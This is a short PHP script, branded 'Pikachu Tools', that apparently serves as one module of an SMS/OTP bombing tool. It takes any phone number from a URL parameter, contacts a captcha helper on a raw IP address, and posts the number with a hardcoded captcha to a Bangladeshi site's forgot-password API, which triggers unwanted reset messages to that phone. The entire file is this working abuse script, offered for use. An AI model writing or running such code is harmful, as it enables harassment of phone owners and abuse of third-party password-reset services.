     <?php
//Babu88
$phn1 = $_GET["phone"];
$phn = ltrim($phn1, '0');
$url1 = "http://178.63.190.211/~xhunterx/call/bhaggo-capcha.php";
$url2 = "https://www.bkash9.com/api/member/reqFgtPsw";

// Request to url1
$curl1 = curl_init($url1);
curl_setopt($curl1, CURLOPT_URL, $url1);
curl_setopt($curl1, CURLOPT_RETURNTRANSFER, true);

// For debug only!
curl_setopt($curl1, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl1, CURLOPT_SSL_VERIFYPEER, false);

$resp1 = curl_exec($curl1);
curl_close($curl1);

// Do not echo the response from url1

// Request to url2
$curl2 = curl_init($url2);
curl_setopt($curl2, CURLOPT_URL, $url2);
curl_setopt($curl2, CURLOPT_POST, true);
curl_setopt($curl2, CURLOPT_RETURNTRANSFER, true);

$headers = array(
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Content-Type: application/x-www-form-urlencoded", // Set content type to URL-encoded
);
curl_setopt($curl2, CURLOPT_HTTPHEADER, $headers);

$data = array(
    'mobile' => $phn,
    'prefix' => '+880',
    'captcha_id' => '6f736b71-8188-4615-bef5-f5a83646d4a8',
    'captcha_code' => '0000'
);

// Convert array to URL-encoded string
$postData = http_build_query($data);

curl_setopt($curl2, CURLOPT_POSTFIELDS, $postData);

// For debug only!
curl_setopt($curl2, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl2, CURLOPT_SSL_VERIFYPEER, false);

$resp2 = curl_exec($curl2);
curl_close($curl2);

echo "Response from Pikachu Tools: ";
echo $resp2;
?>
